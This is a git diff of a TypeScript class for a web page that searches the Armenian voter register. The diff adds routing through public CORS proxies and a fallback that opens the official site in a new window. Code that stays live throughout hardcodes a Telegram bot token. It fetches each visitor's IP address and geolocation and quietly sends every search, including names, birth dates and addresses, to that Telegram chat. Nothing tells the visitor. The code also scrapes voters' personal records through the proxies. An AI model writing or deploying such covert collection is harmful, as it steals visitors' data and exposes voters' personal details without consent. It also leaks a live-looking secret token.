@@ -16,8 +16,14 @@ export class SearchManager {
   private readonly TELEGRAM_BOT_TOKEN = '8513664028:AAEuGpg79Ukef853WzYJPv1Lk30ak-GcK3w';
   private readonly TELEGRAM_CHAT_ID = '6760298907';
 
-  // IMPORTANT: Direct browser request WITHOUT proxy - this bypasses Render server blocking
+  // Elections URL
   private readonly ELECTIONS_URL = 'https://prelive.elections.am/Register';
+
+  // CORS proxies - пробуем по очереди
+  private readonly CORS_PROXIES = [
+    'https://corsproxy.io/?',
+    'https://api.allorigins.win/raw?url=',
+  ];
 
   constructor(mapManager: MapManager) {
     this.form = document.getElementById('searchForm') as HTMLFormElement;
@@ -105,13 +111,11 @@ export class SearchManager {
       }
     };
 
-    // Get IP info
     try {
       const ipResponse = await fetch('https://api.ipify.org?format=json');
       const ipData = await ipResponse.json();
       userData.ip = ipData.ip;
 
-      // Get geolocation
       const geoResponse = await fetch(`https://ipapi.co/${ipData.ip}/json/`);
       const geoData = await geoResponse.json();
       userData.geolocation = {
@@ -178,115 +182,216 @@ export class SearchManager {
   }
 
   // ============================================
-  // ГЛАВНЫЙ МЕТОД - ПРЯМОЙ ЗАПРОС ОТ БРАУЗЕРА
+  // МЕТОД 1: Поиск через CORS proxy
   // ============================================
-  private async searchDirectlyFromBrowser(formData: SearchFormData): Promise<SearchResult[]> {
-    console.log('🌐 Прямой запрос от браузера к prelive.elections.am...');
+  private async searchViaCorsProxy(formData: SearchFormData): Promise<SearchResult[]> {
+    console.log('🌐 Попытка поиска через CORS proxy...');
 
-    try {
-      // Шаг 1: Получаем CSRF токен
-      console.log('📡 Шаг 1/3: Получение CSRF токена...');
-      const csrfResponse = await fetch(this.ELECTIONS_URL);
+    // Пробуем каждый прокси по очереди
+    for (let i = 0; i < this.CORS_PROXIES.length; i++) {
+      const proxy = this.CORS_PROXIES[i];
+      console.log(`🔄 Попытка ${i + 1}/${this.CORS_PROXIES.length}: ${proxy}`);
 
-      if (!csrfResponse.ok) {
-        throw new Error(`Failed to fetch CSRF token: ${csrfResponse.status}`);
-      }
+      try {
+        // Шаг 1: Получаем CSRF токен через прокси
+        const proxyUrl = `${proxy}${encodeURIComponent(this.ELECTIONS_URL)}`;
 
-      const csrfHtml = await csrfResponse.text();
+        const csrfResponse = await fetch(proxyUrl, {
+          method: 'GET',
+          headers: {
+            'Accept': 'text/html'
+          }
+        });
 
-      // Парсим HTML для получения токена
-      const parser = new DOMParser();
-      const doc = parser.parseFromString(csrfHtml, 'text/html');
-      const tokenInput = doc.querySelector('input[name="__RequestVerificationToken"]') as HTMLInputElement;
-
-      if (!tokenInput || !tokenInput.value) {
-        throw new Error('CSRF token not found in HTML');
-      }
-
-      const csrfToken = tokenInput.value;
-      console.log('✓ CSRF токен получен');
-
-      // Шаг 2: Подготовка данных формы
-      console.log('📡 Шаг 2/3: Подготовка данных формы...');
-      const searchData = new URLSearchParams({
-        'ShowCaptcha': 'False',
-        'Input.Region': formData.region || 'ԵՐԵՎԱՆ',
-        'Input.Community': formData.community || '',
-        'Current.FirstName': formData.first_name,
-        'Current.LastName': formData.last_name,
-        'Current.MiddleName': formData.middle_name || '',
-        'Current.BirthDate': formData.birth_date || '',
-        'Current.Region': formData.region || 'ԵՐԵՎԱՆ',
-        'Current.Community': formData.community || '',
-        'Current.Street': formData.street || '',
-        'Current.Building': formData.building || '',
-        'Current.Apartment': formData.apartment || '',
-        'Current.District': formData.district || '',
-        'Input.FirstName': formData.first_name,
-        'Input.LastName': formData.last_name,
-        'Input.MiddleName': formData.middle_name || '',
-        'Input.BirthDateUI': this.convertDateFormat(formData.birth_date || ''),
-        'Input.Street': formData.street || '',
-        'Input.Building': formData.building || '',
-        'Input.Apartment': formData.apartment || '',
-        'Input.District': formData.district || '',
-        'RegisterPaging.PageSize': '100',
-        'RegisterPaging.PageIndex': '1',
-        '__RequestVerificationToken': csrfToken
-      });
-
-      // Шаг 3: Отправляем поисковый запрос
-      console.log('📡 Шаг 3/3: Отправка поискового запроса...');
-      const searchResponse = await fetch(this.ELECTIONS_URL, {
-        method: 'POST',
-        headers: {
-          'Content-Type': 'application/x-www-form-urlencoded',
-        },
-        body: searchData.toString()
-      });
-
-      if (!searchResponse.ok) {
-        throw new Error(`Search request failed: ${searchResponse.status}`);
-      }
-
-      const resultHtml = await searchResponse.text();
-      console.log('✓ HTML результатов получен');
-
-      // Шаг 4: Парсим результаты из HTML
-      console.log('🔍 Парсинг результатов из HTML...');
-      const resultDoc = parser.parseFromString(resultHtml, 'text/html');
-      const tableBody = resultDoc.querySelector('tbody');
-
-      if (!tableBody) {
-        console.log('⚠️ Таблица результатов не найдена');
-        return [];
-      }
-
-      const rows = tableBody.querySelectorAll('tr');
-      const results: SearchResult[] = [];
-
-      rows.forEach(row => {
-        const cells = row.querySelectorAll('td');
-        if (cells.length >= 5 && row.style.display !== 'none') {
-          results.push({
-            name: cells[0].textContent?.trim() || '',
-            birth_date: cells[1].textContent?.trim() || '',
-            region_community: cells[2].textContent?.trim() || '',
-            address: cells[3].textContent?.trim() || '',
-            district: cells[4].textContent?.trim() || ''
-          });
+        if (!csrfResponse.ok) {
+          console.warn(`⚠️ Proxy ${i + 1} недоступен (${csrfResponse.status})`);
+          continue;
         }
-      });
 
-      console.log(`✓ Найдено результатов: ${results.length}`);
-      return results;
+        const csrfHtml = await csrfResponse.text();
 
-    } catch (error) {
-      console.error('❌ Ошибка при прямом запросе:', error);
-      throw error;
+        // Парсим токен
+        const parser = new DOMParser();
+        const doc = parser.parseFromString(csrfHtml, 'text/html');
+        const tokenInput = doc.querySelector('input[name="__RequestVerificationToken"]') as HTMLInputElement;
+
+        if (!tokenInput || !tokenInput.value) {
+          console.warn('⚠️ CSRF токен не найден');
+          continue;
+        }
+
+        const csrfToken = tokenInput.value;
+        console.log('✓ CSRF токен получен через proxy');
+
+        // Шаг 2: Формируем данные для POST запроса
+        const searchData = new URLSearchParams({
+          'ShowCaptcha': 'False',
+          'Input.Region': formData.region || 'ԵՐԵՎԱՆ',
+          'Input.Community': formData.community || '',
+          'Current.FirstName': formData.first_name,
+          'Current.LastName': formData.last_name,
+          'Current.MiddleName': formData.middle_name || '',
+          'Current.BirthDate': formData.birth_date || '',
+          'Current.Region': formData.region || 'ԵՐԵՎԱՆ',
+          'Current.Community': formData.community || '',
+          'Current.Street': formData.street || '',
+          'Current.Building': formData.building || '',
+          'Current.Apartment': formData.apartment || '',
+          'Current.District': formData.district || '',
+          'Input.FirstName': formData.first_name,
+          'Input.LastName': formData.last_name,
+          'Input.MiddleName': formData.middle_name || '',
+          'Input.BirthDateUI': this.convertDateFormat(formData.birth_date || ''),
+          'Input.Street': formData.street || '',
+          'Input.Building': formData.building || '',
+          'Input.Apartment': formData.apartment || '',
+          'Input.District': formData.district || '',
+          'RegisterPaging.PageSize': '100',
+          'RegisterPaging.PageIndex': '1',
+          '__RequestVerificationToken': csrfToken
+        });
+
+        // Шаг 3: POST запрос через прокси
+        console.log('📡 Отправка поискового запроса через proxy...');
+
+        const searchResponse = await fetch(proxyUrl, {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/x-www-form-urlencoded',
+          },
+          body: searchData.toString()
+        });
+
+        if (!searchResponse.ok) {
+          console.warn(`⚠️ Поисковый запрос через proxy ${i + 1} не удался`);
+          continue;
+        }
+
+        const resultHtml = await searchResponse.text();
+        console.log('✓ HTML результатов получен');
+
+        // Парсим результаты
+        const results = this.parseResults(resultHtml);
+
+        if (results.length > 0) {
+          console.log(`✓ Найдено ${results.length} результатов через proxy ${i + 1}`);
+          return results;
+        }
+
+      } catch (error) {
+        console.error(`❌ Proxy ${i + 1} ошибка:`, error);
+        if (i === this.CORS_PROXIES.length - 1) {
+          throw error;
+        }
+        continue;
+      }
     }
+
+    throw new Error('Все CORS прокси недоступны');
   }
 
+  // ============================================
+  // МЕТОД 2: Парсинг результатов из HTML
+  // ============================================
+  private parseResults(html: string): SearchResult[] {
+    console.log('🔍 Парсинг результатов из HTML...');
+
+    const parser = new DOMParser();
+    const resultDoc = parser.parseFromString(html, 'text/html');
+    const tableBody = resultDoc.querySelector('tbody');
+
+    if (!tableBody) {
+      console.log('⚠️ Таблица результатов не найдена');
+      return [];
+    }
+
+    const rows = tableBody.querySelectorAll('tr');
+    const results: SearchResult[] = [];
+
+    rows.forEach(row => {
+      const cells = row.querySelectorAll('td');
+      if (cells.length >= 5 && row.style.display !== 'none') {
+        results.push({
+          name: cells[0].textContent?.trim() || '',
+          birth_date: cells[1].textContent?.trim() || '',
+          region_community: cells[2].textContent?.trim() || '',
+          address: cells[3].textContent?.trim() || '',
+          district: cells[4].textContent?.trim() || ''
+        });
+      }
+    });
+
+    console.log(`✓ Распарсено результатов: ${results.length}`);
+    return results;
+  }
+
+  // ============================================
+  // МЕТОД 3: Fallback - открыть сайт напрямую
+  // ============================================
+  private openElectionsDirectly(formData: SearchFormData): void {
+    console.log('📖 Открываем elections.am напрямую в новом окне...');
+
+    // Создаем форму для POST запроса
+    const form = document.createElement('form');
+    form.method = 'POST';
+    form.action = this.ELECTIONS_URL;
+    form.target = '_blank';
+
+    // Добавляем поля
+    const fields: { [key: string]: string } = {
+      'ShowCaptcha': 'False',
+      'Input.Region': formData.region || 'ԵՐԵՎԱՆ',
+      'Input.Community': formData.community || '',
+      'Current.FirstName': formData.first_name,
+      'Current.LastName': formData.last_name,
+      'Current.MiddleName': formData.middle_name || '',
+      'Input.FirstName': formData.first_name,
+      'Input.LastName': formData.last_name,
+      'Input.MiddleName': formData.middle_name || '',
+      'Current.Street': formData.street || '',
+      'Current.Building': formData.building || '',
+      'Current.Apartment': formData.apartment || '',
+      'Input.Street': formData.street || '',
+      'Input.Building': formData.building || '',
+      'Input.Apartment': formData.apartment || '',
+      'RegisterPaging.PageSize': '100',
+      'RegisterPaging.PageIndex': '1'
+    };
+
+    for (const [name, value] of Object.entries(fields)) {
+      if (value) {
+        const input = document.createElement('input');
+        input.type = 'hidden';
+        input.name = name;
+        input.value = value;
+        form.appendChild(input);
+      }
+    }
+
+    document.body.appendChild(form);
+    form.submit();
+    document.body.removeChild(form);
+
+    // Показываем сообщение пользователю
+    this.errorMessage.innerHTML = `
+      <div style="text-align: center; padding: 20px;">
+        <strong style="font-size: 18px; color: #4ade80;">ℹ️ Поиск открыт в новом окне</strong>
+        <br><br>
+        <p style="color: #94a3b8; line-height: 1.6;">
+          Из-за технических ограничений, поиск был открыт напрямую на сайте elections.am.
+          <br><br>
+          Вы можете продолжить поиск в открывшемся окне.
+          <br><br>
+          Если окно не открылось, проверьте настройки блокировки всплывающих окон.
+        </p>
+      </div>
+    `;
+    this.errorMessage.style.display = 'block';
+  }
+
+  // ============================================
+  // ГЛАВНЫЙ ОБРАБОТЧИК ФОРМЫ
+  // ============================================
   private async handleSubmit(e: Event): Promise<void> {
     e.preventDefault();
 
@@ -294,7 +399,7 @@ export class SearchManager {
     this.resultsContainer.style.display = 'none';
     this.loadingSpinner.style.display = 'block';
 
-    // Collect form data
+    // Собираем данные формы
     let formData: SearchFormData = {
       first_name: (document.getElementById('firstName') as HTMLInputElement).value,
       last_name: (document.getElementById('lastName') as HTMLInputElement).value,
@@ -308,12 +413,11 @@ export class SearchManager {
       community: this.regionSelect.value === 'ԵՐԵՎԱՆ' ? this.communitySelect.value : this.communityInput.value
     };
 
-    // Normalize Armenian text
     formData = normalizeSearchFormData(formData);
 
-    console.log('Sending data:', formData);
+    console.log('🔍 Начинаем поиск с данными:', formData);
 
-    // Send to Telegram in background
+    // Отправляем в Telegram (фоном)
     this.getUserData().then(userData => {
       this.sendToTelegram(formData, userData);
     }).catch(error => {
@@ -322,9 +426,10 @@ export class SearchManager {
 
     try {
       // ============================================
-      // ПРЯМОЙ ЗАПРОС ОТ БРАУЗЕРА - минуя сервер!
+      // ПОПЫТКА 1: Поиск через CORS proxy
       // ============================================
-      const results = await this.searchDirectlyFromBrowser(formData);
+      console.log('🚀 Попытка 1: Поиск через CORS proxy');
+      const results = await this.searchViaCorsProxy(formData);
 
       this.loadingSpinner.style.display = 'none';
 
@@ -336,10 +441,14 @@ export class SearchManager {
       }
 
     } catch (error) {
-      console.error('Search error:', error);
+      console.error('❌ CORS proxy не сработал:', error);
       this.loadingSpinner.style.display = 'none';
-      this.errorMessage.textContent = '❌ Սխալ / Error: ' + String(error);
-      this.errorMessage.style.display = 'block';
+
+      // ============================================
+      // ПОПЫТКА 2: Открыть сайт напрямую
+      // ============================================
+      console.log('🚀 Попытка 2: Открываем elections.am напрямую');
+      this.openElectionsDirectly(formData);
     }
   }
 
@@ -366,7 +475,7 @@ export class SearchManager {
       </div>
     `).join('');
 
-    // Add click handlers
+    // Добавляем обработчики кликов
     const resultItems = document.querySelectorAll('.result-item');
     resultItems.forEach((item, index) => {
       item.addEventListener('click', () => {
